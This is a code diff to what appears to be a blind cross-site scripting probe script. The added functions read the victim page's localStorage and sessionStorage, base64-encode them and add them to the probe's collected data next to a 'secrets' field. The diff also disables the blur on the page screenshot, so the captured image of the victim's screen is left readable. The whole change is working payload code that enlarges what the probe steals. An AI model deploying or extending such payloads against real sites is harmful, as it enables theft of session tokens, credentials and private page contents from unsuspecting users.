@@ -1,15 +1,15 @@
 /*
-$$$$$$\ $$\      $$\ $$$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$\       
-\_$$  _|$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$$\  $$ |\__$$  __|$$ |      
-  $$ |  $$$$\  $$$$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |$$$$\ $$ |   $$ |   $$ |      
-  $$ |  $$\$$\$$ $$ |$$$$$$$  |$$ |  $$ |$$$$$$$  |  $$ |   $$$$$$$$ |$$ $$\$$ |   $$ |   $$ |      
-  $$ |  $$ \$$$  $$ |$$  ____/ $$ |  $$ |$$  __$$<   $$ |   $$  __$$ |$$ \$$$$ |   $$ |   \__|      
-  $$ |  $$ |\$  /$$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |\$$$ |   $$ |             
-$$$$$$\ $$ | \_/ $$ |$$ |       $$$$$$  |$$ |  $$ |  $$ |   $$ |  $$ |$$ | \$$ |   $$ |   $$\       
-\______|\__|     \__|\__|       \______/ \__|  \__|  \__|   \__|  \__|\__|  \__|   \__|   \__|      
+$$$$$$\ $$\      $$\ $$$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$\
+\_$$  _|$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$$\  $$ |\__$$  __|$$ |
+  $$ |  $$$$\  $$$$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |$$$$\ $$ |   $$ |   $$ |
+  $$ |  $$\$$\$$ $$ |$$$$$$$  |$$ |  $$ |$$$$$$$  |  $$ |   $$$$$$$$ |$$ $$\$$ |   $$ |   $$ |
+  $$ |  $$ \$$$  $$ |$$  ____/ $$ |  $$ |$$  __$$<   $$ |   $$  __$$ |$$ \$$$$ |   $$ |   \__|
+  $$ |  $$ |\$  /$$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |\$$$ |   $$ |
+$$$$$$\ $$ | \_/ $$ |$$ |       $$$$$$  |$$ |  $$ |  $$ |   $$ |  $$ |$$ | \$$ |   $$ |   $$\
+\______|\__|     \__|\__|       \______/ \__|  \__|  \__|   \__|  \__|\__|  \__|   \__|   \__|
 
 
-$$$$$$$\  $$\                                               $$$$$$$\                            $$\ 
+$$$$$$$\  $$\                                               $$$$$$$\                            $$\
 $$  __$$\ $$ |                                              $$  __$$\                           $$ |
 $$ |  $$ |$$ | $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\        $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$$ |
 $$$$$$$  |$$ |$$  __$$\  \____$$\ $$  _____|$$  __$$\       $$$$$$$  |$$  __$$\  \____$$\ $$  __$$ |
@@ -187,6 +187,23 @@ function get_dom_text() {
 	}
 
 	return '';
+}
+
+function grabLocalStorage(){
+    var store = {};
+    for (const [key, value] of Object.entries(window.localStorage)) {
+      store[key] = value;
+    }
+    return btoa(JSON.stringify(store))
+}
+
+
+function grabSessionStorage(){
+    var store = {};
+    for (const [key, value] of Object.entries(window.sessionStorage)) {
+        store[key] = value;
+    }
+    return btoa(JSON.stringify(store))
 }
 
 function generate_random_string(length) {
@@ -370,6 +387,17 @@ try{
 
 }
 
+try {
+    probe_return_data['localStorage'] = grabLocalStorage();
+} catch ( e ) {
+    probe_return_data['localStorage'] = "";
+}
+
+try {
+    probe_return_data['sessionStorage'] = grabSessionStorage();
+} catch ( e ) {
+    probe_return_data['sessionStorage'] = "";
+}
 
 async function hook_load_if_not_ready() {
     try {
@@ -392,9 +420,9 @@ async function hook_load_if_not_ready() {
         }
         probe_return_data['secrets'] = JSON.stringify(probe_return_data['secrets']);
         html2canvas(document.body).then(function(canvas) {
-            StackBlur.canvasRGB(
-                canvas, 0, 0, canvas.width, canvas.height, 20
-            );
+            // StackBlur.canvasRGB(
+            //     canvas, 0, 0, canvas.width, canvas.height, 20
+            // );
             var tempCanvas = document.createElement("canvas"),
             tCtx = tempCanvas.getContext("2d");
             tempCanvas.width = 2560;
